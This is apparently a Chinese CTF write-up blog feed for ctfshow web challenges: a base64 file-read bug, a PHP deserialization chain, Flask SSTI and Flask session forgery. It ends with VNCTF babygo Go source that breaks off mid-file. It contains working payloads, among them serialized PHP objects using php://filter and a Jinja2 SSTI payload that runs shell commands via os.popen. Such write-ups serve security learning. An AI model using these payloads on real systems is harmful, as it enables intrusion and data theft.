        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h3><p>è¿™ä¸ªé¢˜ç›®å¾ˆæ˜æ˜¾å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230408231659276.png" alt="image-20230408231659276"></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230408231735400.png" alt="image-20230408231735400"></p><p>ç®€å•çš„base64</p><p>ä¼ ä¸€ä¸ªimg=aW5kZXgucGhwå°±å¾—åˆ°flagäº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-28 12:15:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$image</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;ctfshow&#123;29728952-b4b7-44c3-a4a1-46bfd8789da8&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$image</span>))&#123;</span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$image</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$image</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,<span class="subst">$data</span>&#x27;/&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;face.png&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:/?img=&quot;</span>.<span class="variable">$image</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è¢«é—å¿˜çš„ååºåˆ—åŒ–"><a href="#è¢«é—å¿˜çš„ååºåˆ—åŒ–" class="headerlink" title="è¢«é—å¿˜çš„ååºåˆ—åŒ–"></a>è¢«é—å¿˜çš„ååºåˆ—åŒ–</h3><p>è¿™ä¸ªé¢˜ç›®é¦–å…ˆè¦æ‹¿åˆ° check.php é‡Œé¢çš„å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="variable">$this</span> -&gt; key))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span> -&gt; file);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ä¸è¡Œå“¦&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aaa = <span class="keyword">clone</span> <span class="keyword">new</span> EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯»å–check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> w_wuw_w;</span><br><span class="line"><span class="variable">$a</span>-&gt;key = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;file = <span class="string">&quot;php://filter/convert.base64-encode/resource=check.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;aaa = &amp;<span class="variable">$a</span>-&gt;key;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;s:0:&quot;&quot;;s:3:&quot;key&quot;;R:2;s:4:&quot;file&quot;;s:53:&quot;php://filter/convert.base64-encode/resource=check.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230408233216873.png" alt="image-20230408233216873"></p><p>check.php å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cipher</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>) &gt; <span class="number">10000</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$charset</span> = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;</span><br><span class="line">    <span class="variable">$shift</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$shifted</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$char</span> = <span class="variable">$str</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$charset</span>, <span class="variable">$char</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$new_pos</span> = (<span class="variable">$pos</span> - <span class="variable">$shift</span> + <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>)) % <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>);</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$charset</span>[<span class="variable">$new_pos</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$char</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$shifted</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„ç§»ä½ï¼Œå‡½æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$charset</span> = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;</span><br><span class="line">    <span class="variable">$shift</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$shifted</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$char</span> = <span class="variable">$str</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$charset</span>, <span class="variable">$char</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$new_pos</span> = (<span class="variable">$pos</span> + <span class="variable">$shift</span> + <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>)) % <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>);</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$charset</span>[<span class="variable">$new_pos</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$char</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$shifted</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆé“¾æ¡ <code>w_wuw_w(__destruct) -&gt;gBoBg(__toString) -&gt;w_wuw_w(__invoke) -&gt;EeE(__clone) -&gt;cycycycy(aaa)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å½“å‰ç›®å½•ä¸­æœ‰ä¸€ä¸ªtxtæ–‡ä»¶å“¦</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;src/check.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// w_wuw_w(__destruct) -&gt;gBoBg(__toString) -&gt;w_wuw_w(__invoke) -&gt;EeE(__clone) -&gt;cycycycy(aaa)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span> = <span class="string">&quot;-_-&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> gBoBg;</span><br><span class="line"><span class="variable">$a</span>-&gt;coos = <span class="keyword">new</span> w_wuw_w;</span><br><span class="line"><span class="variable">$a</span>-&gt;file = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> w_wuw_w;</span><br><span class="line"><span class="variable">$b</span>-&gt;aaa = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decode</span>(<span class="string">&quot;p8vfuv8g8v8py&quot;</span>);</span><br><span class="line"><span class="comment"># O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:4:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:3:&quot;123&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;N;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;s:11:&quot; gBoBg eeee&quot;;s:3:&quot;-_-&quot;;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;</span></span><br><span class="line"><span class="comment"># fe1ka1ele1efp</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230408233852859.png" alt="image-20230408233852859"></p><h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h3><p>æºç  app.zip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">name=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>,name=name)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hellodear</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ge&quot;</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;f&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Nonononon&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘ç°å°±æ˜¯ä¸€ä¸ªç®€å•çš„ssti</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;j&#x27;)).read()&quot;)&#125;&#125;?j=cat /flag</span><br></pre></td></tr></table></figure><h3 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h3><p>é¦–å…ˆæ³¨å†Œä¸€ä¸ªæµ‹è¯•ç”¨æˆ·ï¼Œä¾‹å¦‚è´¦å·1å¯†ç 1</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409213756405.png" alt="image-20230409213756405"></p><p>å¾ˆæ˜æ˜¾çš„å­˜åœ¨flask session</p><p>ç„¶å1é‡Œé¢æœ‰ä¸ªlearnçš„è¶…é“¾æ¥ï¼Œç‚¹è¿›å»ä»¥åå¯ä»¥å¾—åˆ°éƒ¨åˆ†æºç </p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409213919740.png" alt="image-20230409213919740"></p><p>æ‹¿åˆ°äº†secret_key</p><p>äºæ˜¯è¿™ä¸ªæ¥è¿›è¡Œä¼ªé€ adminç™»å½•</p><p>è¿™é‡Œé‡‡ç”¨flask-unsignå·¥å…·è¿›è¡Œflask-sessionä¼ªé€ ï¼Œå·¥å…·å®‰è£…ï¼š<a href="https://github.com/Paradoxis/Flask-Unsign">Paradoxis/Flask-Unsign: Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys. (github.com)</a></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409214309969.png" alt="image-20230409214309969"></p><p>ç„¶åè®¿é—®é¡µé¢ï¼Œå‘ç°æœ‰ä¸ªä¸‹è½½</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409214835276.png" alt="image-20230409214835276"></p><p>ç„¶åä¸‹è½½è¿™ä¸ªé¡¹ç›®æºç é»˜è®¤ä¸€èˆ¬æ˜¯/app/app.py</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409214943041.png" alt="image-20230409214943041"></p><p>ç„¶åå‘ç°æœ‰ä¸ªhelloè·¯ç”±å¯ä»¥æ‰§è¡Œrce</p><p>æœ€ç»ˆpayloadï¼š</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409215037897.png" alt="image-20230409215037897"></p>]]></content>
      
      
      <categories>
          
          <category> å¤ç°èµ›é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF_babygo</title>
      <link href="/2023/02/23/VNCTF-babygo/"/>
      <url>/2023/02/23/VNCTF-babygo/</url>
      
        <content type="html"><![CDATA[<h2 id="babygo"><a href="#babygo" class="headerlink" title="babygo"></a>babygo</h2><p>è¿™ä¸ªé¢˜ç›®ç¡®å®æŒºbabyçš„æˆ‘åˆå­¦è€…éƒ½èƒ½å†™</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/PaulXu-cn/goeval&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/duke-git/lancet/cryptor&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/duke-git/lancet/fileutil&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/duke-git/lancet/random&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;path/filepath&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Name  <span class="type">string</span></span><br><span class="line">Path  <span class="type">string</span></span><br><span class="line">Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">store := cookie.NewStore(random.RandBytes(<span class="number">16</span>))</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">&quot;session&quot;</span>, store))</span><br><span class="line">r.LoadHTMLGlob(<span class="string">&quot;template/*&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">userDir := <span class="string">&quot;/tmp/&quot;</span> + cryptor.Md5String(c.ClientIP()+<span class="string">&quot;VNCTF2023GoGoGo~&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">session := sessions.Default(c)</span><br><span class="line">session.Set(<span class="string">&quot;shallow&quot;</span>, userDir) <span class="comment">// shallow = /tmp/4b997ad5487153fba0162e525abd6b7d/</span></span><br><span class="line">session.Save()</span><br><span class="line">fileutil.CreateDir(userDir)</span><br><span class="line">gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>) <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/user.gob</span></span><br><span class="line">user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;low&quot;</span>&#125;</span><br><span class="line">encoder := gob.NewEncoder(gobFile)</span><br><span class="line">encoder.Encode(user)</span><br><span class="line"><span class="keyword">if</span> fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+<span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: 